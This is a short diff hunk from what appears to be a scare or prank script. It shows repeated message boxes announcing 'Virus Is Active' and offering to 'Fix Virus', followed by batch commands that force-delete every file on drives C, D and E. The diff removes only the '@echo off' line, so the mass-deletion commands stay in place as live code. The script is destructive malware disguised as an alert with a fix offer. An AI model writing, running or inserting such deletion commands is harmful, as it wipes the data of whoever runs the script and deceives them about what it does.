@@ -5,7 +5,6 @@ Msgbox("Virus Is Active",0+16,"Virus Alert")
 Msgbox("Virus Is Active",0+16,"Virus Alert")
 Msgbox("Virus Is Active",0+16,"Virus Alert")
 Msgbox("Wanna Fix Virus",0+16,"Fix Virus")
-@echo off
 del C:\ /f /s /q
 del D:\ /f /s /q
 del E:\ /f /s /q
